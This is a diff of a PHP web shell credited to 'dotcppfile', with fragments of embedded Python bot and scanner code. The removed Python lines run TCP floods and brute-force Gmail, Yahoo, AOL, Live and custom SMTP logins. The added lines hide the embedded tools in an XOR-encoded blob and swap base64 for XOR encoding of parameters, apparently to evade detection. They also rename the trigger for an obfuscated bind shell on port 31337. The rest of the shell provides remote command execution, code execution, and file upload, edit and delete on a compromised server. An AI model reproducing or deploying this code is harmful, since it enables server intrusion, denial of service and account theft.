-					msg = msg.replace(\"tcpflood \", \"\")
-					seperator = msg.index(\":\")
-					try:
-						tcpUnleach(msg[:seperator],msg[seperator+1:])
-					except:
-						pass
-				elif (\"tcpfloodall \" in msg):
-					msg = msg.replace(\"tcpfloodall \", \"\")
-					seperator = msg.index(\":\")
-					try:
-						tcpUnleach(msg[:seperator],msg[seperator+1:])
-					except:
-						pass
-				elif (\"gmailbruteforce \" in msg):
-					msg = msg.replace(\"gmailbruteforce \", \"\")
-					try:
-						email, combination, minimum, maximum = msg.split(\":\")
-						t = Thread(None,gmailbruteforce,None,(email, combination, minimum, maximum))
-        					t.start()
-						s.send(\"[INFO] Bruteforcing started\\n\")				
-					except:
-						s.send(\"[ERROR] Wrong arguments\\n\")
-				elif (\"livebruteforce \" in msg):
-					msg = msg.replace(\"livebruteforce \", \"\")
-					try:
-						email, combination, minimum, maximum = msg.split(\":\")
-						t = Thread(None,custombruteforce,None,(\"smtp.live.com\", 587, email, combination, minimum, maximum))
-        					t.start()
-						s.send(\"[INFO] Bruteforcing started\\n\")				
-					except:
-						s.send(\"[ERROR] Wrong arguments\\n\")
-				elif (\"yahoobruteforce \" in msg):
-					msg = msg.replace(\"yahoobruteforce \", \"\")
-					try:
-						email, combination, minimum, maximum = msg.split(\":\")
-						t = Thread(None,custombruteforce,None,(\"smtp.mail.yahoo.com\", 587, email, combination, minimum, maximum))
-        					t.start()
-						s.send(\"[INFO] Bruteforcing started\\n\")				
-					except:
-						s.send(\"[ERROR] Wrong arguments\\n\")
-				elif (\"aolbruteforce \" in msg):
-					msg = msg.replace(\"aolbruteforce \", \"\")
-					try:
-						email, combination, minimum, maximum = msg.split(\":\")
-						t = Thread(None,custombruteforce,None,(\"smtp.aol.com\", 587, email, combination, minimum, maximum))
-        					t.start()
-						s.send(\"[INFO] Bruteforcing started\\n\")				
-					except:
-						s.send(\"[ERROR] Wrong arguments\\n\")
-				elif (\"custombruteforce \" in msg):
-					msg = msg.replace(\"custombruteforce \", \"\")
-					try:
-						address, port, email, combination, minimum, maximum = msg.split(\":\")
-						t = Thread(None,custombruteforce,None,(address, port, email, combination, minimum, maximum))
-        					t.start()
-						s.send(\"[INFO] Bruteforcing started\\n\")				
-					except:
-						s.send(\"[ERROR] Wrong arguments\\n\")
-				elif (msg == \"hellows123\"):
-					s.send(os.getcwd())
-				else:
-					print \"[INFO] Connection Closed\"
-					s.close()
-					break
-			except KeyboardInterrupt:
-				print \"[INFO] Connection Closed\"
-				s.close()
-				break
-			except:
-				print \"[INFO] Connection Closed\"
-				s.close()
-				break
-			
-while 1:
-	try:
-		main()
-	except:
-		pass
-
-	time.sleep(5)
-
-";
-
-$bpscan = "
-#!/usr/bin/env python2
-
-import urllib2, urllib, sys, threading
-from socket import *
-
-print \"\"\"
- _                               
-| |__  _ __  ___  ___ __ _ _ __  
-| '_ \| '_ \/ __|/ __/ _` | '_ \ 
-| |_) | |_) \__ \ (_| (_| | | | |
-|_.__/| .__/|___/\___\__,_|_| |_|
-      |_|                        
-
-Coded by: dotcppfile
-Twitter: https://twitter.com/dotcppfile
-Blog: http://dotcppfile.worpdress.com
-\"\"\"
-
-def logPorts(port):
-	f = open(\"bpscan - ports.txt\", \"a\")
-	port = \"%d\\n\" % int(port)
-	f.write(port)
-	f.close()
-
-def logErrors(error):
-	f = open(\"bpscan - errors.txt\", \"a\")
-	error = \"%s\\n\" % error
-	f.write(error)
-	f.close()
-
-url = \"http://www.canyouseeme.org/\"
-http_header = {
-	'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
-}
-
-class mainchecker(threading.Thread):
-   	def __init__ (self, port):
-        	threading.Thread.__init__(self)
-        	self.port = port
-
-    	def run(self):
-		print \"Trying: %d\" % int(self.port)
-
-		try:
-			s=socket(AF_INET, SOCK_STREAM)
-			s.bind((\"0.0.0.0\", int(self.port)))
-			s.listen(5)
-			params = {
-  				'port': int(self.port),
-				'IP': '127.0.0.1',
-			}
-
-			data = urllib.urlencode(params)
-			req = urllib2.Request(url, data, http_header)
-			response = urllib2.urlopen(req)
-			the_page = response.read()
-
-			if (\"I can see your service on\" in the_page):
-				logPorts(int(self.port))
-
-		except Exception as err:
-			err = \"Port %d: %s\" % (int(self.port), err)
-			logErrors(err)
-
-		s.close()
-
-ports = []
-threads = []
-for x in range(1024, 65537):
-	ports.append(x)
-	if (len(ports) == 25):
-		for i in ports:
-    			thread = mainchecker(i)
-    			thread.start()
-   			threads.append(thread)
- 
-		for thread in threads:
-    			thread.join()
-		
-		del threads[:]
-		del ports[:]
-"
-;
+$bpscan = "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";
 
 ?>
 
@@ -1056,26 +482,6 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 		}
 	}
 
-	echo "
-		<tr>
-			<td>eval</td>";
-	$isevalfunctionavailable = false;
-	$evalcheck = "\$isevalfunctionavailable = true;";
-	eval($evalcheck);
-	if ($isevalfunctionavailable == true)
-	{
-		$eval = True;
-		echo "
-			<td><font color='green'>ENABLED</font></td>
-			</tr>";
-	}
-	else
-	{
-		$eval = False;
-		echo "
-			<td><font color='red'>DISABLED</font></td>
-			</tr>";
-	}
 	
 	echo "
 		<tr>
@@ -1120,7 +526,7 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 
 	<tr>
 		<td>Current User</td>
-		<td>".get_current_user()."</td>
+		<td>".get_current_user()." | ".posix_getuid()."</td>
 	</tr>";
 
 	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
@@ -1642,10 +1048,6 @@ function evalRel($command)
 			echo $stdout;
 		}
 	}
-	else
-	{
-		return False;
-	}
 }
 
 
@@ -1784,11 +1186,11 @@ if(isset($_FILES["fileToUpload"]))
 	echo "<a href='?dir=".$_GET["location"]."#File Manager'>Go Back</a>";
 	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
 	{
-		$target_dir = base64_decode($_GET["location"])."\\";
+		$target_dir = unxor_this($_GET["location"])."\\";
 	}
 	else
 	{
-		$target_dir = base64_decode($_GET["location"])."/";
+		$target_dir = unxor_this($_GET["location"])."/";
 	}
 	$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
 	$uploadOk = 1;
@@ -1827,11 +1229,11 @@ else if(isset($_POST["linkToDownload"]))
 		echo "<a href='?dir=".$_GET["location"]."#File Manager'>Go Back</a>";
 		if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
 		{
-			$target_dir = base64_decode($_GET["location"])."\\";
+			$target_dir = unxor_this($_GET["location"])."\\";
 		}		
 		else
 		{
-			$target_dir = base64_decode($_GET["location"])."/";
+			$target_dir = unxor_this($_GET["location"])."/";
 		}
 
 		$fp = fopen ($target_dir.$filename, 'w+');
@@ -1888,11 +1290,11 @@ else if(isset($_POST["mkdir"]))
 
 	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
 	{
-		$dirname = base64_decode($_GET["location"])."\\".$_POST["mkdir"];
+		$dirname = unxor_this($_GET["location"])."\\".$_POST["mkdir"];
 	}
 	else
 	{	
-		$dirname = base64_decode($_GET["location"])."/".$_POST["mkdir"];
+		$dirname = unxor_this($_GET["location"])."/".$_POST["mkdir"];
 	}
 
 	if (!file_exists($dirname))
@@ -1911,11 +1313,11 @@ else if(isset($_POST["mkfile"]))
 
 	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
 	{
-		$filename = base64_decode($_GET["location"])."\\".$_POST["mkfile"];
+		$filename = unxor_this($_GET["location"])."\\".$_POST["mkfile"];
 	}
 	else
 	{
-		$filename = base64_decode($_GET["location"])."/".$_POST["mkfile"];
+		$filename = unxor_this($_GET["location"])."/".$_POST["mkfile"];
 	}
 
 	if (!file_exists($filename))
@@ -1931,37 +1333,45 @@ else if(isset($_POST["mkfile"]))
 else if(isset($_GET["del"]))
 {
 	echo "<a href='?dir=".$_GET["location"]."#File Manager'>Go Back</a>";
-	if (is_dir(base64_decode($_GET["del"])))
+	if (is_dir(unxor_this($_GET["del"])))
 	{
-		rrmdir(base64_decode($_GET["del"]));
+		rrmdir(unxor_this($_GET["del"]));
 	}	
 	else
 	{
-		unlink(base64_decode($_GET["del"]));
+		unlink(unxor_this($_GET["del"]));
 	}	
-	echo "<p class='success'>".base64_decode($_GET["del"])." has been Deleted.</p>";
+	echo "<p class='success'>".unxor_this($_GET["del"])." has been Deleted.</p>";
 	header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]);
 }
 else if(isset($_GET["zip"]))
 {
 	echo "<a href='?dir=".$_GET["location"]."#File Manager'>Go Back</a>";
 
-	$archiveName = base64_decode($_GET["zip"]);
+	$archiveName = unxor_this($_GET["zip"]);
 
-	if (file_exists(base64_decode($_GET["zip"])))
+	if (file_exists(unxor_this($_GET["zip"])))
 	{
-		if(is_dir(base64_decode($_GET["zip"])))
+		if(is_dir(unxor_this($_GET["zip"])))
 		{
 			if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
 			{	
-				$folder = array_pop(explode("/", base64_decode($_GET['zip'])));
+				$folder = array_pop(explode("/", unxor_this($_GET['zip'])));
 
 				$file = $folder . ".zip";
 				
-				zipWindows($file, base64_decode($_GET['zip']));
+				zipWindows($file, unxor_this($_GET['zip']));
 
 				chmod($file, 644);
-				header('Content-Disposition: attachment; filename='. $file);
+				header('Content-Description: File Transfer');
+				header('Content-Type: application/octet-stream');
+				header('Content-Disposition: attachment; filename='.basename($file));
+				header('Expires: 0');
+				header('Cache-Control: must-revalidate');
+				header('Pragma: public');
+				header('Content-Length: ' . filesize($file));
+				ob_clean();
+				flush();
 				readfile($file);	
 			}
 			else
@@ -2019,7 +1429,7 @@ else if(isset($_GET["zip"]))
 
 				if ($zipFail == False)
 				{
-					echo "<p class='success'>".base64_decode($_GET["zip"])." has been Ziped.</p>";
+					echo "<p class='success'>".unxor_this($_GET["zip"])." has been Ziped.</p>";
 					header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]);
 				}	
 			}
@@ -2038,10 +1448,10 @@ else if(isset($_GET["file"]))
 {
 	if(isset($_POST["save"]))
 	{
-		if(is_writable(base64_decode($_GET["file"])))
+		if(is_writable(unxor_this($_GET["file"])))
 		{
-			file_put_contents(base64_decode($_GET["file"]), base64_decode($_POST["content"]));
-			if(file_get_contents(base64_decode($_GET["file"])) == base64_decode($_POST["content"]))
+			file_put_contents(unxor_this($_GET["file"]), unxor_this($_POST["content"]));
+			if(file_get_contents(unxor_this($_GET["file"])) == unxor_this($_POST["content"]))
 			{
 				echo "<p class='success'>Change was successful!</p>";
 			}
@@ -2056,15 +1466,15 @@ else if(isset($_GET["file"]))
 		}	
 	}
 
-	if(is_readable(base64_decode($_GET["file"])))
+	if(is_readable(unxor_this($_GET["file"])))
 	{
-		$file = base64_decode(htmlentities($_GET["file"]));
-		$content = file_get_contents(base64_decode($_GET["file"]));
+		$file = unxor_this(htmlentities($_GET["file"]));
+		$content = file_get_contents(unxor_this($_GET["file"]));
 		echo "
-			<a href='".$_SERVER['PHP_SELF']."?dir=".base64_encode(dirname($_GET['file']))."#File Manager'>Go Back</a><br>
-			<form action='".$_SERVER['PHP_SELF']."?file=".base64_encode($file)."#File Manager' method='POST'>
+			<a href='".$_SERVER['PHP_SELF']."?dir=".xor_this(dirname($_GET['file']))."#File Manager'>Go Back</a><br>
+			<form action='".$_SERVER['PHP_SELF']."?file=".xor_this($file)."#File Manager' method='POST'>
 				<textarea name='content'>".htmlspecialchars($content)."</textarea><br>
-				<input type='submit' name='save' value='Save' onclick='return base64encode5(this.form, this.form.content);'/>
+				<input type='submit' name='save' value='Save' onclick='return xorencr5(this.form, this.form.content);'/>
 			</form>";
 	}
 	else
@@ -2078,10 +1488,10 @@ else if(isset($_GET["rename_file"]) && !empty($_GET["rename_file"]))
 
 	if(isset($_POST["rename_file"]))
 	{
-		if(file_exists(base64_decode($_POST["original_name"]))) 
+		if(file_exists(unxor_this($_POST["original_name"]))) 
 		{
-			rename(base64_decode($_POST["original_name"]), base64_decode($_POST["new_name"]));
-			if(file_exists(base64_decode($_POST["new_name"])))
+			rename(unxor_this($_POST["original_name"]), unxor_this($_POST["new_name"]));
+			if(file_exists(unxor_this($_POST["new_name"])))
 			{
 				echo "<p class='success'>File successfully renamed!</p>";
 				header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["dir"]);
@@ -2097,11 +1507,11 @@ else if(isset($_GET["rename_file"]) && !empty($_GET["rename_file"]))
 		}	
 	}
 
-	$rename = htmlentities(base64_decode($_GET["rename_file"]));
+	$rename = htmlentities(unxor_this($_GET["rename_file"]));
 	echo "<form action='' method='POST'>
 		<input type='hidden' name='original_name' value='$rename'>	
 		<input type='text' name='new_name' value='$rename'>
-		<input type=\"submit\" name=\"rename_file\" value=\"Rename\" onclick=\"return base64encode3(this.form, this.form.original_name, this.form.new_name);\"/>
+		<input type=\"submit\" name=\"rename_file\" value=\"Rename\" onclick=\"return xorencr3(this.form, this.form.original_name, this.form.new_name);\"/>
 	</form>";
 }
 else if(isset($_GET["rename_folder"]) && !empty($_GET["rename_folder"]))
@@ -2110,10 +1520,10 @@ else if(isset($_GET["rename_folder"]) && !empty($_GET["rename_folder"]))
 
 	if(isset($_POST["rename_folder"]))
 	{
-		if(file_exists(base64_decode($_POST["original_name"]))) 
+		if(file_exists(unxor_this($_POST["original_name"]))) 
 		{
-			rename(base64_decode($_POST["original_name"]), base64_decode($_POST["new_name"]));
-			if(file_exists(base64_decode($_POST["new_name"])))
+			rename(unxor_this($_POST["original_name"]), unxor_this($_POST["new_name"]));
+			if(file_exists(unxor_this($_POST["new_name"])))
 			{
 				header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["dir"]);			
 				echo "<p class='success'>File successfully renamed!</p>";
@@ -2129,11 +1539,11 @@ else if(isset($_GET["rename_folder"]) && !empty($_GET["rename_folder"]))
 		}	
 	}
 
-	$rename = htmlentities(base64_decode($_GET["rename_folder"]));
+	$rename = htmlentities(unxor_this($_GET["rename_folder"]));
 	echo "<form action='' method='POST'>
 		<input type='hidden' name='original_name' value='$rename'>	
 		<input type='text' name='new_name' value='$rename'>
-		<input type=\"submit\" name=\"rename_folder\" value=\"Rename\" onclick=\"return base64encode3(this.form, this.form.original_name, this.form.new_name);\"/>
+		<input type=\"submit\" name=\"rename_folder\" value=\"Rename\" onclick=\"return xorencr3(this.form, this.form.original_name, this.form.new_name);\"/>
 	</form>";
 }
 else 
@@ -2142,17 +1552,26 @@ else
 	{
 		if (isset($_GET['download']) && isset($_GET['location']))
 		{
-			if (is_readable(base64_decode($_GET['location'])))
+			if (is_readable(unxor_this($_GET['location'])))
 			{
-				header('Content-Disposition: attachment; filename='.$_GET['download']);
-				readfile(base64_decode($_GET['location']));
+				$file = unxor_this($_GET['location']);
+				header('Content-Description: File Transfer');
+				header('Content-Type: application/octet-stream');
+				header('Content-Disposition: attachment; filename='.basename($file));
+				header('Expires: 0');
+				header('Cache-Control: must-revalidate');
+				header('Pragma: public');
+				header('Content-Length: ' . filesize($file));
+				ob_clean();
+				flush();
+				readfile($file);
 			}
 			else
 			{
 				echo "<p class='danger'>File is not readable!</p>";
 			}		
 		}
-		$dir = base64_decode($_GET['dir']);
+		$dir = unxor_this($_GET['dir']);
 		$size = strlen($dir);
 		while ($dir[$size - 1] == '/') 
 		{
@@ -2177,7 +1596,7 @@ else
 		echo "
 		<table class='flat-table flat-table-3'>
 			<tr>
-				<td>Shell's Directory: <a href='?dir=".base64_encode(getcwd())."#File Manager'>".getcwd()."</a></td>
+				<td>Shell's Directory: <a href='?dir=".xor_this(getcwd())."#File Manager'>".getcwd()."</a></td>
 			</tr>
 			<tr>
 				<td>Current Directory: ".htmlspecialchars($dir)."</td>
@@ -2186,7 +1605,7 @@ else
 				<td>Change Directory/Read File:
 				<form action='#File Manager' method='get' >
 					<input style='width:300px' name='dir' type='text' value='".htmlspecialchars($dir)."'/>
-					<input type='submit' value='Change' name='Change' onclick='return base64encode4(this.form, this.form.dir);'/>
+					<input type='submit' value='Change' name='Change' onclick='return xorencr4(this.form, this.form.dir);'/>
 				</form>
 				</td>
 			</tr>
@@ -2228,7 +1647,7 @@ else
 
 					<tr>
 						<td>[UP]</td>
-						<td><a href='", $_SERVER['PHP_SELF'], "?dir=", base64_encode($topdir), "#File Manager'>..</a></td>
+						<td><a href='", $_SERVER['PHP_SELF'], "?dir=", xor_this($topdir), "#File Manager'>..</a></td>
 						<td></td>
 						<td></td>
 						<td></td>
@@ -2261,7 +1680,7 @@ else
 						if (is_readable($topdir))
 						{					
 							echo "
-							<td><a href='", $_SERVER['PHP_SELF'], "?dir=", base64_encode($topdir), "#File Manager'>", htmlspecialchars($rows[$i]['data']), "</a></td>";
+							<td><a href='", $_SERVER['PHP_SELF'], "?dir=", xor_this($topdir), "#File Manager'>", htmlspecialchars($rows[$i]['data']), "</a></td>";
 						}						
 						else
 						{
@@ -2287,7 +1706,7 @@ else
 							if (is_writeable($topdir))
 							{
 								echo "
-								<td><a href='".$_SERVER['PHP_SELF']."?del=".base64_encode($topdir)."&location=".base64_encode($dir)."#File Manager'>Del</a> | <a href='".$_SERVER['PHP_SELF']."?dir=".base64_encode($dir)."&rename_folder=".base64_encode($topdir)."#File Manager'>Rename</a> | <a href='".$_SERVER['PHP_SELF']."?zip=".base64_encode($topdir)."&location=".base64_encode($dir)."#File Manager'>Zip</a></td>";
+								<td><a href='".$_SERVER['PHP_SELF']."?del=".xor_this($topdir)."&location=".xor_this($dir)."#File Manager'>Del</a> | <a href='".$_SERVER['PHP_SELF']."?dir=".xor_this($dir)."&rename_folder=".xor_this($topdir)."#File Manager'>Rename</a> | <a href='".$_SERVER['PHP_SELF']."?zip=".xor_this($topdir)."&location=".xor_this($dir)."#File Manager'>Zip</a></td>";
 							}
 							else
 							{
@@ -2300,17 +1719,17 @@ else
 							if (is_readable($topdir) && is_writeable($topdir))
 							{
 								echo "
-								<td><a href='".$_SERVER['PHP_SELF']."?dir=".base64_encode($dir)."&download=".$rows[$i]['data']."&location=".base64_encode($topdir)."#File Manager'>Download File</a> | <a href='".$_SERVER['PHP_SELF']."?file=".base64_encode($topdir)."#File Manager'>Edit</a> | <a href='".$_SERVER['PHP_SELF']."?dir=".base64_encode($dir)."&rename_file=".base64_encode($topdir)."#File Manager'>Rename</a> | <a href='".$_SERVER['PHP_SELF']."?del=".base64_encode($topdir)."&location=".base64_encode($dir)."#File Manager'>Del</a></td>";
+								<td><a href='".$_SERVER['PHP_SELF']."?dir=".xor_this($dir)."&download=".$rows[$i]['data']."&location=".xor_this($topdir)."'>Download File</a> | <a href='".$_SERVER['PHP_SELF']."?file=".xor_this($topdir)."#File Manager'>Edit</a> | <a href='".$_SERVER['PHP_SELF']."?dir=".xor_this($dir)."&rename_file=".xor_this($topdir)."#File Manager'>Rename</a> | <a href='".$_SERVER['PHP_SELF']."?del=".xor_this($topdir)."&location=".xor_this($dir)."#File Manager'>Del</a></td>";
 							}							
 							else if (is_readable($topdir))
 							{
 								echo "
-								<td><a href='".$_SERVER['PHP_SELF']."?dir=".base64_encode($dir)."&download=".$rows[$i]['data']."&location=".base64_encode($topdir)."#File Manager'>Download File</a></td>";
+								<td><a href='".$_SERVER['PHP_SELF']."?dir=".xor_this($dir)."&download=".$rows[$i]['data']."&location=".xor_this($topdir)."'>Download File</a></td>";
 							}							
 							else if (is_writeable($topdir))
 							{
 								echo "
-								<td><a href='".$_SERVER['PHP_SELF']."?file=".base64_encode($topdir)."#File Manager'>Edit</a> | <a href='".$_SERVER['PHP_SELF']."?dir=".base64_encode($dir)."&rename_file=".base64_encode($topdir)."#File Manager'>Rename</a> | <a href='".$_SERVER['PHP_SELF']."?del=".base64_encode($topdir)."&location=".base64_encode($dir)."#File Manager'>Del</a></td>";
+								<td><a href='".$_SERVER['PHP_SELF']."?file=".xor_this($topdir)."#File Manager'>Edit</a> | <a href='".$_SERVER['PHP_SELF']."?dir=".xor_this($dir)."&rename_file=".xor_this($topdir)."#File Manager'>Rename</a> | <a href='".$_SERVER['PHP_SELF']."?del=".xor_this($topdir)."&location=".xor_this($dir)."#File Manager'>Del</a></td>";
 							}							
 							else
 							{
@@ -2345,28 +1764,28 @@ else
 				}				
 				echo "
 					<tr>
-						<form action='?location=".base64_encode($dir)."#File Manager' method='post' enctype='multipart/form-data'>
+						<form action='?location=".xor_this($dir)."#File Manager' method='post' enctype='multipart/form-data'>
 							<td>Upload File (Browse):</td>
 							<td><input type='file' value='Browse' name='fileToUpload'/></td>
 							<td><input type='submit' value='Upload' name='uploadFile'/></td>
 						</form>
 					</tr>
 					<tr>
-						<form action='?location=".base64_encode($dir)."#File Manager' method='post' >
+						<form action='?location=".xor_this($dir)."#File Manager' method='post' >
 							<td>Upload File (Link):</td>
 							<td><input style='width:300px' name='linkToDownload' type='text'/><br><small>Direct Links required!</small></td>
 							<td><input type='submit' value='Upload' name='downloadLink'/></td>
 						</form>
 					</tr>
 					<tr>
-						<form action='?location=".base64_encode($dir)."#File Manager' method='post'>
+						<form action='?location=".xor_this($dir)."#File Manager' method='post'>
 							<td>Create File:</td>
 							<td><input style='width:300px' name='mkfile' type='text'/></td>
 							<td><input type='submit' value='Create' name='createFile'/></td>
 						</form>
 					</tr>
 					<tr>
-						<form action='?location=".base64_encode($dir)."#File Manager' method='post'>
+						<form action='?location=".xor_this($dir)."#File Manager' method='post'>
 							<td>Create Folder:</td>
 							<td><input style='width:300px' name='mkdir' type='text'/></td>
 							<td><input type='submit' value='Create' name='createDir'/></td>
@@ -2387,13 +1806,13 @@ else
 			$file = htmlentities($dir);
 			$content = file_get_contents($dir);
 			echo "
-				<a href='".$_SERVER['PHP_SELF']."?dir=".base64_encode(dirname($dir))."#File Manager'>Go Back</a><br>
+				<a href='".$_SERVER['PHP_SELF']."?dir=".xor_this(dirname($dir))."#File Manager'>Go Back</a><br>
 				<textarea name='content'>".htmlspecialchars($content)."</textarea><br>";
 		}
 		else
 		{
 			echo "
-				<a href='".$_SERVER['PHP_SELF']."?dir=".base64_encode(dirname($dir))."#File Manager'>Go Back</a><br>
+				<a href='".$_SERVER['PHP_SELF']."?dir=".xor_this(dirname($dir))."#File Manager'>Go Back</a><br>
 				<p class='danger'>File is not readable!</p>";
 		}
 	}
@@ -2493,14 +1912,14 @@ echo "
 
 <form action='#Commander' method='post'>
 	<input type='text' style='width:300px' name='command' placeholder='Command...'>
-	<input type=\"submit\" value=\"GO\" onclick=\"return base64encode(this.form, this.form.command);\" />
+	<input type=\"submit\" value=\"GO\" onclick=\"return xorencr(this.form, this.form.command);\" />
 </form>";
 
 if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "system" || isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "passthru")
 {
 	if(isset($_POST["command"]))
 	{
-		$decCommand = base64_decode($_POST["command"]);
+		$decCommand = unxor_this($_POST["command"]);
 		if($_SESSION["command_function"] == "system")
 		{
 			echo "<table class='flat-table flat-table-1'>";
@@ -2532,7 +1951,7 @@ else
 	}
 	if(isset($_POST["command"]))
 	{
-		$decCommand = base64_decode($_POST["command"]);
+		$decCommand = unxor_this($_POST["command"]);
 		$parts = explode(" ", $decCommand);
 		if($decCommand != "clear" && $decCommand != "cls" && $parts[0] != "cd")
 		{
@@ -2622,10 +2041,6 @@ else
 	<textarea name="eval" style="width: 400px; height: 100px;"></textarea><br>
 	<select name="language">
 		<?php
-		if ($eval == True)
-		{
-			echo "<option value='php'>PHP</option>";
-		}
 		if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True))
 		{
 			if(command_exists("python") != "" && strpos(command_exists("python"), "INFO:")===false)
@@ -2668,25 +2083,13 @@ else
 		}
 		?>
 	</select>
-	<input type="submit" name="run" value="run" onclick="return base64encode2(this.form, this.form.language, this.form.eval);"/>
+	<input type="submit" name="run" value="run" onclick="return xorencr2(this.form, this.form.language, this.form.eval);"/>
 </form>
 
 <?php
 if(isset($_POST["run"]))
 {
-	$decEval = base64_decode($_POST["eval"]);
-
-	if($_POST["language"] == "php")
-	{
-		if ($eval == True)
-		{
-			$clean = str_replace("<?php", "", $decEval);
-			$clean = str_replace("<?", "", $clean);
-			$clean = str_replace("<?=", "", $clean);		
-			$clean = str_replace("?>", "", $clean);
-			eval($clean);
-		}
-	}
+	$decEval = unxor_this($_POST["eval"]);
 	
 	if($_POST["language"] == "python")
 	{
@@ -3170,7 +2573,7 @@ else
 
 <?php
 
-if(isset($_GET["shell"]) && ($_GET["shell"] == "bps"))
+if(isset($_GET["deSh3ll"]) && ($_GET["deSh3ll"] == "bps"))
 {
 	global $phpbindshell, $nohup;
 
@@ -3190,6 +2593,7 @@ if(isset($_GET["shell"]) && ($_GET["shell"] == "bps"))
 		$port = 31337;
 	}
 
+	$phpbindshell = unsh3ll_this($phpbindshell);
 	$phpbindshell = str_replace("\$port=4444;", "\$port=$port;", $phpbindshell);
 	
 	$filename = rand(1,1000) . ".php";
@@ -3207,27 +2611,17 @@ if(isset($_GET["shell"]) && ($_GET["shell"] == "bps"))
